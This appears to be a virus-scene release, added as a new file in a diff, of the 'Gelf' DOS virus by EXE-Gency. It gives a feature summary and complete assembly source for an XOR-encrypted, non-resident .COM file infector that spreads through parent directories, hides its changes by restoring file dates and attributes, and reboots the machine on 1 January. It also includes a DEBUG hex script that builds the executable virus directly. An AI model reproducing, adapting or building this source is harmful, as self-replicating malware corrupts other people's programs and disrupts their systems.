@@ -1,0 +1,244 @@
+   _____  _____   ___  ___ __ __
+  /  |  \|  _  \  \  \/  /|  |  |
+ /       \   __/   \    / |  |  |
+ \       /  |       \  /  |  |  |
+  \_____/|__|        \/   |__|__|
+
+PRESENTS:
+The Gelf Virus
+By EXE-Gency
+
+Comment #                       
+                       ÉÍÍÍÄÄ  ú        ú  ÄÄÍÍÍ»
+                       º        ( GELF )        º
+                       º b y  E X E - G e n c y º
+                       ÈÍÍÍÄÄ  ú        ú  ÄÄÍÍÍ¼
+
+        Another old virus. The only difference between this and the Pity
+virus is that it's encrypted.
+
+Virus Name : Gelf
+Author     : EXE-Gency
+Size       : 1B6h bytes (file growth)
+Type       : Non-overwriting, non-Resident, encrypted.
+Targets    : *.COM files
+Stealth    : Infects files with any attributes.
+             Restores file's time/date stamp and attributes.
+General    : Infects all files in the current directory and works it's
+             may to the root with '..' calls. (Also restores original
+             directory.)
+             If it's the 1st of January, some details about Gelf will
+             be displayed on the screen. The computer will then wait
+             for a key press then re-boot the machine.
+Assembling : TASM GELF.ASM
+             TLINK /T GELF.OBJ
+             DO NOT RUN THE GELF.COM FILE IT IS THE VIRUS!
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+#
+prog            segment                 ; Setup segments
+                assume  CS:prog, DS:prog; CS+DS in same seg
+                org     100h            ; .COM file
+
+Main:           db      0E9h, 00h, 00h  ; Jump to VirusStart
+
+VirusStart:     call    GetDelta        ; Get DeltaOffset
+GetDelta:       pop     bp              ; Pop IP
+                sub     bp, offset GetDelta ; BP=Delta Offset
+                
+                mov     ah, 2Ah         ; Get Date
+                int     21h             ; DOS Int
+
+                cmp     dx, 0101h       ; 1st January? 1/1/??
+                jne     NoPayload       ; No -> Dont display msg
+
+                mov     ah, 09h         ; Write string
+                lea     dx, VirusInfo   ; DX points to VX info
+                int     21h             ; DOS Int
+                
+                mov     ah, 01h         ; Get Keypress
+                int     21h             ; DOS Int
+                int     19h             ; Reboot (but not in WIN95)
+
+NoPayload:      call    Encrypt_Decrypt ; Decrypt virus
+                jmp     RestoreOldBytes ; Restore 1st 3 bytes of host
+
+EncryptionVal   dw      0000h         ; Enc/Dec val (0=no encryption)
+
+WriteCode:      call    Encrypt_Decrypt ; Encrypt virus
+
+                mov     ah, 40h         ; Write Virus
+                mov     cx, offset virusend-virusstart ; Virus size
+                lea     dx, [bp + virusstart] ; Start of Virus
+                int     21h             ; DOS Int
+                call    Encrypt_Decrypt ; Decrypt
+                ret                     ; Return
+                
+Encrypt_Decrypt:mov     bx, word ptr [bp + EncryptionVal]
+                lea     si, [bp + RestoreOldBytes]
+                mov     cx, [offset Random - offset RestoreOldBytes]
+
+XORAgain:       xor     word ptr [si], bx
+                inc     si
+                inc     si
+                loop    XORAgain
+                ret
+
+RestoreOldBytes:lea     si, [bp + buffer]
+                mov     di, 0100h
+                movsb
+                movsw
+
+                mov     ah, 1Ah
+                lea     dx, [bp + virusend]
+                int     21h
+
+                mov     ah, 47h
+                mov     dl, 00h
+                lea     si, CurrentDir
+                int     21h
+
+FindFirst:      mov     ah, 4Eh
+                lea     dx, [bp + FileMask]
+                mov     cx, 0000h
+
+FindNext:       int     21h
+                jnc     $ + 5
+                jmp     DoParent
+
+                mov     ax, 4301h
+                mov     cx, 0000h
+                lea     dx, [bp + VirusEnd + 1Eh]
+                int     21h
+                jnc     $ + 5
+                jmp     FindMore
+
+                mov     ax, 3D02h
+                lea     dx, [bp + virusend + 1Eh]
+                int     21h
+                jc      RestoreAttribs
+
+                xchg    ax, bx
+
+                mov     ah, 3Fh
+                mov     cx, 0003h
+                lea     dx, [bp + buffer]
+                int     21h
+                jc      RestoreAttribs
+                
+                cmp     byte ptr [bp + buffer], 0E9h
+                jz      RestoreAttribs
+
+                mov     ax, 4202h
+                mov     cx, 0000h
+                mov     dx, 0000h
+                int     21h
+                jc      RestoreAttribs
+
+                sub     ax, 03h
+                mov     word ptr [bp + jumpbytes + 1], ax
+
+Random:         mov     ah, 2Ch
+                int     21h
+                add     dl, dh
+                cmp     bx, 00h
+                je      Random
+                mov     word ptr [bp + EncryptionVal], bx
+                call    WriteCode
+
+                mov     ax, 4200h
+                mov     cx, 0000h
+                mov     dx, 0000h
+                int     21h
+                jc      RestoreAttribs
+
+                mov     ah, 40h
+                mov     cx, 0003h
+                lea     dx, [bp + jumpbytes]
+                int     21h
+                
+RestoreAttribs: mov     ax, 4301h
+                mov     cx, word ptr [bp + VirusEnd + 15h]
+                lea     dx, [bp + VirusEnd + 1Eh]
+                int     21h
+
+                mov     ax, 5701h
+                mov     cx, word ptr [bp + VirusEnd + 16h]
+                mov     dx, word ptr [bp + VirusEnd + 18h]
+                int     21h
+                
+Close:          mov     ah, 3Eh
+                int     21h
+
+FindMore:       mov     ah, 4Fh
+                jmp     findnext
+
+RestoreDTA:     mov     ah, 1Ah
+                mov     dx, 0080h
+                int     21h
+
+                mov     ax, 0100h
+                push    ax
+                ret
+
+DoParent:       mov     ah, 3Bh
+                lea     dx, Dot_Dot
+                int     21h
+                jc      RestoreDir
+                jmp     FindFirst
+
+RestoreDir:     mov     ah, 3Bh
+                lea     dx, Slash
+                int     21h
+                jmp     RestoreDTA
+
+FileMask        db      '*.com', 00h
+Slash           db      '\'
+CurrentDir      db      64 dup (0)
+Dot_Dot         db      '..', 00h
+Buffer          db      0CDh, 20h, 00h
+JumpBytes       db      0E9h, 00h, 00h
+VirusInfo       db      '[Gelf] Virus written by EXE-Gency!$'
+VirusEnd:
+Prog            ends
+                end     main
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+If you don't have TASM/TLINK, just copy and past the debug script below to a
+new text file and then type:
+debug < filename
+and a file called gelf.com will appear. This is the virus so be careful.
+
+N GELF.COM
+E 0100 E9 00 00 E8 00 00 5D 81 ED 06 01 B4 2A CD 21 81 
+E 0110 FA 01 01 75 0D B4 09 BA 82 02 CD 21 B4 01 CD 21 
+E 0120 CD 19 E8 17 00 EB 28 90 00 00 E8 0F 00 B4 40 B9 
+E 0130 A2 01 8D 96 03 01 CD 21 E8 01 00 C3 3E 8B 9E 28 
+E 0140 01 8D B6 4F 01 B9 71 00 31 1C 46 46 E2 FA C3 8D 
+E 0150 B6 7C 02 BF 00 01 A4 A5 B4 1A 8D 96 A5 02 CD 21 
+E 0160 B4 47 B2 00 BE 39 02 CD 21 B4 4E 8D 96 32 02 B9 
+E 0170 00 00 CD 21 73 03 E9 A4 00 B8 01 43 B9 00 00 8D 
+E 0180 96 C3 02 CD 21 73 03 E9 82 00 B8 02 3D 8D 96 C3 
+E 0190 02 CD 21 72 56 93 B4 3F B9 03 00 8D 96 7C 02 CD 
+E 01A0 21 72 48 3E 80 BE 7C 02 E9 74 40 B8 02 42 B9 00 
+E 01B0 00 BA 00 00 CD 21 72 33 2D 03 00 3E 89 86 80 02 
+E 01C0 B4 2C CD 21 02 D6 83 FB 00 74 F5 3E 89 9E 28 01 
+E 01D0 E8 57 FF B8 00 42 B9 00 00 BA 00 00 CD 21 72 0B 
+E 01E0 B4 40 B9 03 00 8D 96 7F 02 CD 21 B8 01 43 3E 8B 
+E 01F0 8E BA 02 8D 96 C3 02 CD 21 B8 01 57 3E 8B 8E BB 
+E 0200 02 3E 8B 96 BD 02 CD 21 B4 3E CD 21 B4 4F E9 61 
+E 0210 FF B4 1A BA 80 00 CD 21 B8 00 01 50 C3 B4 3B BA 
+E 0220 79 02 CD 21 72 03 E9 40 FF B4 3B BA 38 02 CD 21 
+E 0230 EB DF 2A 2E 63 6F 6D 00 5C 00 00 00 00 00 00 00 
+E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0270 00 00 00 00 00 00 00 00 00 2E 2E 00 CD 20 00 E9 
+E 0280 00 00 5B 47 65 6C 66 5D 20 56 69 72 75 73 20 77 
+E 0290 72 69 74 74 65 6E 20 62 79 20 45 58 45 2D 47 65 
+E 02A0 6E 63 79 21 24 
+RCX
+01A5
+W
+Q
